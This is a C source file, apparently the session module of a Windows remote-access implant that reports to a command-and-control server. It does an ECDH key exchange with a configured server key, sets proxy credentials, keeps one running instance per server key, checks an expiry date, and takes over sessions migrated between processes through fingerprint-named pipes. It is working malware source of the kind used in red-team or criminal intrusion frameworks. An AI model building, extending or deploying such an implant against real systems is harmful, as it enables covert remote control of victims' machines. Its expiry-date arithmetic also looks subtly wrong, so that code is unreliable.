#ifdef _WIN32
#include <Windows.h>
#endif

#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <synchapi.h>
#include <process.h>
#include <io.h>
#include <fcntl.h>
#include <time.h>
#include "cJSON.h"
#include "agent_shell.h"
#include "agent_named_pipe.h"
#include "mbedtls/base64.h"
#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/ecdh.h"
#include "agent_session.h"
#include "agent_utility.h"
#include "agent_config.h"
#include "agent_event.h"
#include "agent_process.h"
#include "agent_network.h"

static void create_single_instance_event(session* sess, char* encoded_server_pubkey) {
	char event_name[4096] = { 0 };
	strcat(event_name, "Global\\");
	// each agent has a different server public key
	strcat_s(event_name, sizeof event_name, encoded_server_pubkey);
	event_handle* e = event_open(event_name);
	if (e) {
		// event exists, need to exit
		event_free(e);
	}
	else {
		// first run, create the event to avoid multiple agent run
		sess->single_instance_event = event_new(event_name);
	}
}

bool session_refresh(session* sess)
{
	bool result = true;	
	cJSON* proxy_info = cJSON_GetObjectItem(sess->active_server, CONFIG_SERVER_PROXY);

	// set proxy
	if (proxy_info) {
		cJSON* jproxy_address = cJSON_GetObjectItem(proxy_info, "address");
		cJSON* jproxy_port = cJSON_GetObjectItem(proxy_info, "port");
		cJSON* jproxy_username = cJSON_GetObjectItem(proxy_info, "username");
		cJSON* jproxy_password = cJSON_GetObjectItem(proxy_info, "password");
		cJSON* jproxy_type = cJSON_GetObjectItem(proxy_info, "type");
		if (jproxy_address && jproxy_port && jproxy_username && jproxy_password && jproxy_type) {
			// delete old proxy 
			proxy_free(sess->proxy);
			sess->proxy = OBJ_ALLOC(proxy);
			if (!sess->proxy) goto fail;
			sess->proxy->address = _strdup(jproxy_address->valuestring);
			sess->proxy->port = jproxy_port->valueint;
			sess->proxy->username = _strdup(jproxy_username->valuestring);
			sess->proxy->password = _strdup(jproxy_password->valuestring);
			sess->proxy->type =
				!strcmp(jproxy_type->valuestring, "socks5") ? SOCKS5 :
				!strcmp(jproxy_type->valuestring, "http") ? HTTP : AUTO;

		}
	}
	else {
		proxy* p = sess->proxy;
		sess->proxy = ZERO(proxy);
		proxy_free(p);
	}

exit:
	return result;

fail:
	result = false;
	goto exit;
}

static bool initialize_session(session* sess, char const* prog_name) 
{
	uint8_t* my_pubkey = ZERO(uint8_t);
	uint8_t* server_pubkey = ZERO(uint8_t);
	uint8_t* raw_sess_id = ZERO(uint8_t);
	mbedtls_ecdh_context ctx;
	mbedtls_entropy_context entropy;
	mbedtls_ctr_drbg_context ctr_drbg;

#ifdef _WIN32
	// initialize mutex for concurrent network request
	sess->net_mutex = OBJ_ALLOC(CRITICAL_SECTION);
	if (!sess->net_mutex) goto fail;
	if (!InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)sess->net_mutex, 0x00000400)) goto fail;
#else
#error Network mutex initialization on non Windows platform is not supported
#endif

	// set prog name
	sess->prog_name = _strdup(prog_name);
	if (!sess->prog_name) goto fail;

	// initialize random number generation	
	mbedtls_ctr_drbg_init(&ctr_drbg);
	mbedtls_entropy_init(&entropy);
	if (mbedtls_ctr_drbg_seed(&ctr_drbg, mbedtls_entropy_func, &entropy, 0, 0)) goto fail;

	// initialize context
	mbedtls_ecdh_init(&ctx);
	if (mbedtls_ecp_group_load(&ctx.grp, MBEDTLS_ECP_DP_CURVE25519)) goto fail;

	// generate the public key to send to the server
	if (mbedtls_ecdh_gen_public(&ctx.grp, &ctx.d, &ctx.Q,
		mbedtls_ctr_drbg_random, &ctr_drbg)) goto fail;

	my_pubkey = MEM_ALLOC(32);
	if (!my_pubkey) goto fail;
	if (mbedtls_mpi_write_binary_le(&ctx.Q.X, my_pubkey, 32)) goto fail;

	// read server public key
	cJSON* jpubkey = cJSON_GetObjectItemCaseSensitive(sess->config, CONFIG_PUBKEY);
	if (!jpubkey) goto fail;

	size_t server_pubkey_len = 0;
	server_pubkey = base64_decode(jpubkey->valuestring, &server_pubkey_len);

	// generate the shared secret to encrypt the data
	if (mbedtls_mpi_lset(&ctx.Qp.Z, 1)) goto fail;

	if (mbedtls_mpi_read_binary_le(&ctx.Qp.X, server_pubkey, server_pubkey_len)) goto fail;

	size_t olen = 32;
	sess->session_key = MEM_ALLOC(olen);
	if (!sess->session_key) goto fail;
	sess->original_session_key = MEM_ALLOC(olen);
	if (!sess->original_session_key) goto fail;

	if (mbedtls_ecdh_calc_secret(&ctx, &olen, sess->session_key, olen,
		mbedtls_ctr_drbg_random, &ctr_drbg)) goto fail;
	memcpy(sess->original_session_key, sess->session_key, olen);

	mbedtls_ctr_drbg_free(&ctr_drbg);
	mbedtls_entropy_free(&entropy);
	mbedtls_ecdh_free(&ctx);

	// allocate and write server pub key hash
	size_t raw_sess_id_size = olen + sizeof(uint32_t);
	raw_sess_id = MEM_ALLOC(raw_sess_id_size);
	if (!raw_sess_id) goto fail;
	*((uint32_t*)raw_sess_id) = custom_FNV1a32(server_pubkey_len, server_pubkey);
	memcpy((uint8_t*)raw_sess_id + sizeof(uint32_t), my_pubkey, olen);

	// set as session Id the generated public key and hash
	sess->session_id = base64_encode(raw_sess_id_size, raw_sess_id);
	if (!sess->session_id) goto fail;
	sess->session_id_size = strlen(sess->session_id);

	// create single instance event to avoid multiple run of the same exact agent
	create_single_instance_event(sess, jpubkey->valuestring);

	FREE(raw_sess_id);
	FREE(my_pubkey);
	FREE(server_pubkey);		
	return session_refresh(sess);

fail:
	FREE(raw_sess_id);
	FREE(my_pubkey);
	FREE(server_pubkey);
	return false;
}

static bool migrate_from_process(session* sess, char* migration_info) {
	cJSON* sess_info = ZERO(cJSON);

	// parse the received json, read the info and set the values in the current session
	sess_info = cJSON_Parse(migration_info);
	if (!sess_info) goto fail;

	cJSON* effective_config = cJSON_GetObjectItemCaseSensitive(sess_info, MIGRATION_EFFECTIVECONFIG);
	cJSON* session_key = cJSON_GetObjectItemCaseSensitive(sess_info, MIGRATION_SESSION_KEY);
	cJSON* original_session_key = cJSON_GetObjectItemCaseSensitive(sess_info, MIGRATION_ORIGINALSESSIONKEY);
	cJSON* key_iteration = cJSON_GetObjectItemCaseSensitive(sess_info, MIGRATION_SESSIONKEYITERATION);
	cJSON* public_IP = cJSON_GetObjectItemCaseSensitive(sess_info, MIGRATION_PUBLICIP);
	cJSON* active_server = cJSON_GetObjectItemCaseSensitive(sess_info, MIGRATION_ACTIVESERVER);
	cJSON* session_id = cJSON_GetObjectItemCaseSensitive(sess_info, MIGRATION_SESSIONID);
	
	// check mandatory fields
	if (
		!effective_config ||
		!session_key ||
		!original_session_key ||
		!key_iteration ||
		!public_IP ||
		!active_server ||
		!session_id
		)
		goto fail;

	// set effective config
	if (sess->config) cJSON_free(sess->config);
	sess->config = cJSON_Parse(effective_config->valuestring);

	// set session key
	FREE(sess->session_key);
	sess->session_key = base64_decode(session_key->valuestring, ZERO(size_t));

	// set original session key
	FREE(sess->original_session_key);
	sess->original_session_key = base64_decode(original_session_key->valuestring, ZERO(size_t));

	// set key iteration
	sess->session_key_iteration = key_iteration->valueint;

	// set public IP
	FREE(sess->public_IP);
	sess->public_IP = _strdup(public_IP->valuestring);

	// set active server
	if (sess->active_server) cJSON_free(sess->active_server);
	cJSON* servers = cJSON_GetObjectItemCaseSensitive(sess->config, CONFIG_SERVER);
	cJSON* servers_type = ZERO(cJSON);
	cJSON* srv = ZERO(cJSON);
	cJSON_ArrayForEach(servers_type, servers) {
		if (sess->active_server) break;
		if (!strcmp(servers_type->string, active_server->child->string)) {
			uint32_t index = 0;
			cJSON_ArrayForEach(srv, servers_type) {
				if (index == active_server->child->valueint) {
					sess->active_server = cJSON_Duplicate(srv, true);
					sess->active_server_index = index;
					sess->active_server_type = _strdup(servers_type->string);
					break;
				}				
				index++;
			}
		}
	}

	// set session ID
	FREE(sess->session_id);
	sess->session_id = _strdup(session_id->valuestring);
	sess->session_id_size = strlen(session_id->valuestring);

	// create single instance event to avoid multiple run of the same exact agent
	cJSON* jpubkey = cJSON_GetObjectItemCaseSensitive(sess->config, CONFIG_PUBKEY);
	create_single_instance_event(sess, jpubkey->valuestring);

	// refresh session
	if (!session_refresh(sess)) goto fail;

	// is established
	sess->is_established = true;

	cJSON_free(sess_info);
	return true;
fail:
	if (sess_info) cJSON_free(sess_info);
	return false;
}

static bool check_for_migration(session* sess) {
	char* migration_info = ZERO(char);
	pipe_handle* hPipe = ZERO(pipe_handle);

	// create the named pipe name that is custom to this process	
	uint32_t seed = system_fingerprint() + _getpid();
	char pipe_name[64] = "\\\\.\\pipe\\";	
	gen_random_string(seed, 32, &pipe_name[strlen(pipe_name)]);

	// check if the server named pipe show-up
	if (pipe_client_wait_for_server(pipe_name, 0x4000)) {
		// create the named pipe	
		hPipe = pipe_client_connect(pipe_name);
		if (!hPipe) goto fail;

		// read the json string
		size_t const buffer_size = 4096;
		migration_info = MEM_ALLOC(buffer_size);
		if (!migration_info) goto fail;
		size_t offset = 0;
		while (true) {
			if (!pipe_data_available(hPipe)) {
				if (offset > 0) break;
				sleep_ms(1000);
				continue;
			}

			int nbytes = pipe_read(hPipe, buffer_size, (void*)(migration_info + offset));
			if (nbytes <= 0) break;	
			offset += nbytes;

			if (nbytes == buffer_size) {
				migration_info = realloc(migration_info, offset + buffer_size);
				if (!migration_info) goto fail;
				memset(migration_info + offset, 0, buffer_size);
			}						
		}
		if (!offset) goto fail;

		// execute migration by parsing the received information
		migrate_from_process(sess, migration_info);

		// pipe no more used
		pipe_free(hPipe);

		// set the event to signal the parent that the migration was successful
		char event_name[4096] = { 0 };
		strcat(event_name, "Global\\");
		gen_random_string(seed + 5, 30, &event_name[strlen(event_name)]);
		event_handle* e = event_open(event_name);
		if (!e) goto fail;
		event_set(e);
		event_free(e);
	}		
	
	FREE(migration_info);
	return true;

fail:
	pipe_free(hPipe);
	FREE(migration_info);	
	return false;
}

bool is_agent_expired(session* sess) {	
	struct tm timeinfo = { 0 };

	cJSON* jsession = cJSON_GetObjectItem(sess->config, CONFIG_SESSION);
	if (!jsession) goto not_expired;
	cJSON* jexpire = cJSON_GetObjectItem(jsession, CONFIG_SESSION_EXPIRATION);
	if (!jexpire) goto not_expired;

	// check expiration
	if (!sscanf(
		jexpire->valuestring,
		"%04d-%02d-%02d %02d:%02d:%02d",
		&timeinfo.tm_year,
		&timeinfo.tm_mon,
		&timeinfo.tm_mday,
		&timeinfo.tm_hour,
		&timeinfo.tm_min,
		&timeinfo.tm_sec
	))
		goto not_expired;

	timeinfo.tm_year -= 1900;
	timeinfo.tm_mon--;
	timeinfo.tm_mday--;
	timeinfo.tm_hour--;
	timeinfo.tm_min--;
	timeinfo.tm_sec--;

	time_t expire = mktime(&timeinfo);
	time_t now = time(0);
	bool is_expired = difftime(expire, now) < 0;
	return is_expired;

not_expired:
	return false;
}

session* session_create(char* jconfig, char const* prog_name) {
	session* sess = OBJ_ALLOC(session);	
	sess->is_established = false;
	sess->exit = false;
	sess->config = cJSON_Parse(jconfig);
	if (!sess->config) goto fail;

	sess->intercepted_processes = ZERO(process_intercepted);	

	if (is_agent_expired(sess)) goto fail;

	if (!initialize_session(sess, prog_name)) {
		// initialization failed, probably due to the bogus configu for migration
		if (!check_for_migration(sess)) goto fail;
	}
	
	return sess;

fail:
	return ZERO(session);
}


session* session_free(session* sess) {
	// free all started threads
	thread_handle** p = sess->thread_handles;
	if (p) {
		while (*p) {
			thread_free(*p, true);
			p++;
		}
	}	
	
	shell_free(sess->shell);
	if (sess->config) cJSON_free(sess->config);
	process_intercepted* cur = sess->intercepted_processes;
	while (cur) {
		process_intercepted* next = cur->next;
		FREE(cur);
		cur = next;
	}
	event_free(sess->single_instance_event);
	proxy_free(sess->proxy);
	FREE(sess->active_server_type);
	FREE(sess->prog_name);
	FREE(sess->session_id);
	FREE(sess->session_key);
	FREE(sess->original_session_key);
	FREE(sess->public_IP);
	FREE(sess->net_mutex);
	FREE(sess->thread_handles);

	// zero value
	sess->active_server_type = ZERO(char);
	sess->prog_name = ZERO(char);
	sess->session_id = ZERO(char);
	sess->session_key = ZERO(uint8_t);
	sess->original_session_key = ZERO(uint8_t);;
	sess->public_IP = ZERO(char);
	sess->net_mutex = ZERO(void);

	FREE(sess);
	return ZERO(session);
}

bool session_release_garbage(session* sess)
{
	bool result = true;
	thread_handle** p = sess->thread_handles;
	uint32_t num_running_threads = 0;
	if (p) {
		// count how many actibe threads are stored
		while (*p) {
			if (thread_is_alive(*p)) {
				num_running_threads++;
			}
			p++;
		}

		int i = 0;
		thread_handle** new_array = MEM_ALLOC((num_running_threads + 1) * sizeof(thread_handle*));
		if (!new_array) goto fail;

		// remove not running thread
		p = sess->thread_handles;
		thread_handle** pn = new_array;
		while (*p) {
			if (thread_is_alive(*p)) {
				*pn = *p;
				pn++;
			}
			else {
				thread_free(*p, true);
			}
			p++;
		}
		FREE(sess->thread_handles);
		sess->thread_handles = new_array;
	}	

exit:
	return result;
fail:
	result = false;
	goto exit;
}

bool session_add_thread(thread_handle* thread, session* sess)
{
	bool result = true;
	uint32_t num_slots = 1; // start as 1 since the last slot is NULL
	thread_handle** p = sess->thread_handles;
	if (p) {
		while (*p) {
			num_slots++;
			p++;
		}
	}

	// space for the new handle
	num_slots++;
	sess->thread_handles = realloc(sess->thread_handles, num_slots * sizeof(thread_handle*));
	if (!sess->thread_handles) goto fail;
	sess->thread_handles[num_slots - 2] = thread;
	sess->thread_handles[num_slots - 1] = ZERO(thread_handle*);
exit:
	return result;
fail:
	result = false;
	goto exit;
}

thread_handle* session_start_thread(thread_proc callback, void* args, session* sess)
{
	thread_handle* thread = ZERO(thread_handle);		
	thread = thread_start(callback, args);
	if (!thread) goto fail;
	if (!session_add_thread(thread, sess)) goto fail;
exit:
	return thread;
fail:
	thread_free(thread, true);
	thread = ZERO(thread_handle);
	goto exit;
}